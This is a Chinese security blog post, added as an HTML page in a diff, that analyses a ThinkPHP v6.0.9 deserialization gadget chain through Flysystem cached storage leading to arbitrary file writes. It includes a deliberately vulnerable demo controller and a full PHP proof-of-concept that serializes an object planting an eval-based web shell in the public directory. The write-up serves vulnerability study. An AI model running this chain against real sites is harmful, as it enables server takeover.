@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/ThinkPHP%20v6.0.9%20save()%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/ThinkPHP%20v6.0.9%20save()%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/","path":"2023/12/25/ThinkPHP v6.0.9 save() 反序列化 任意写文件/","title":"ThinkPHP v6.0.9 反序列化&任意写文件 分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ThinkPHP v6.0.9 反序列化&任意写文件 分析 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/ThinkPHP%20v6.0.9%20save()%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ThinkPHP v6.0.9 反序列化&任意写文件 分析 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP v6.0.9 反序列化&任意写文件 分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ThinkPHP%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">ThinkPHP漏洞集合</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从Y4tacker师傅直播中了解，自己跟一下</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Quest_sec/article/details/105340807">用phpstudy部署thinkphp6 / 使用教程</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ec97455b5ec044d89012e825d2297e81.png"></p>
+<p>使用composer安装tp6 php版本在7.1以上</p>
+<a id="more"></a>
+<p>写入demo:</p>
+<p>D:\phpstudy_pro\WWW\tp\app\controller\Index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$unser</span> = <span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">		unserialize(<span class="variable">$unser</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>poc:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Filesystem</span>\<span class="title">AbstractAdapter</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;file=<span class="string">&quot;cys2.php&quot;</span>;  <span class="comment">//文件名称</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;complete=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;  <span class="comment">//内容</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> \League\Flysystem\Adapter\Local();  <span class="comment">//has()方法</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">		protected $pathPrefix = &quot;./&quot;;  //这里进行目录的更改</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$<span class="title">a</span> = <span class="title">new</span> \<span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>();</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在/public目录下生成cys.php</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e9f4eb5a48034b07b64b7c99bb4f750c.png"></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>全局搜索 __destruct()</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/38e48dbce15c402799399ffe0873195c.png"></p>
+<p>在src/Storage/AbstractCache.php</p>
+<blockquote>
+<p>abstract class AbstractCache implements CacheInterface</p>
+</blockquote>
+<p>如果autosave为false则执行save()函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e023c40b7d504fe0a1d7435e66f33110.png"></p>
+<p>搜索当前文件没有发现save()函数，看到当前类为抽象类，搜索谁继承了当前类</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/02e0c73c739e4d908278702cc69deea5.png"></p>
+<p>在src/Storage/Adapter.php 发现save()函数</p>
+<blockquote>
+<p>class Adapter extends AbstractCache</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a5346184f4c441ddb0e1cda4e9a4aa30.png"></p>
+<p>跟进getForStorage()函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/055bc28d0684404c8b2645c99e273716.png"></p>
+<p>发现参数<code>cache</code> <code>complete</code> 和方法<code>cleanContents()</code>在抽象类中, <code>expire</code>在当前类中</p>
+<p>跟进cleanContents()发现没什么用，那么在save()函数中<code>$contents参数我们可控</code></p>
+<p>接下来进行一个has()方法的判断，我们肯定是想进行write()方法，那么has()就要返回一个false</p>
+<p>搜索has()方法，在src/Adapter/Local.php</p>
+<blockquote>
+<p>class Local extends AbstractAdapter</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/87b342723e834acb8e1c54b56ebb9876.png"></p>
+<p>在它的抽象类中跟进到applyPathPrefix()</p>
+<p>src/Adapter/AbstractAdapter.php</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ac077b965cff41f2bb4576bfe2d60bd9.png"></p>
+<p>跟进getPathPrefix()</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/11a4dcae58e14fbfa014d700eb2dddd8.png"></p>
+<p>这里的<code>pathPrefix可控</code>，让pathPrefix为 <code>./</code> 再配合ltrim可以控制任意写入文件的目录地址</p>
+<p>ltrim意思是去除  <code>\</code>  最终返回到has()的 <code>file_exists($location)</code> 因为这里的<code>$location</code>是我们写入的文件名: <code>./cys.php</code>不存在，所以返回false</p>
+<p>然后向上返回到write()函数，写入一句话</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/" rel="prev" title="ThinkPHP v3.2 comment 注释注入写shell">
+                  <i class="fa fa-angle-left"></i> ThinkPHP v3.2 comment 注释注入写shell
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ThinkPHP%20v6.0.9%20eval%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" rel="next" title="ThinkPHP v6.0.9-12 eval反序列化代码执行 分析">
+                  ThinkPHP v6.0.9-12 eval反序列化代码执行 分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
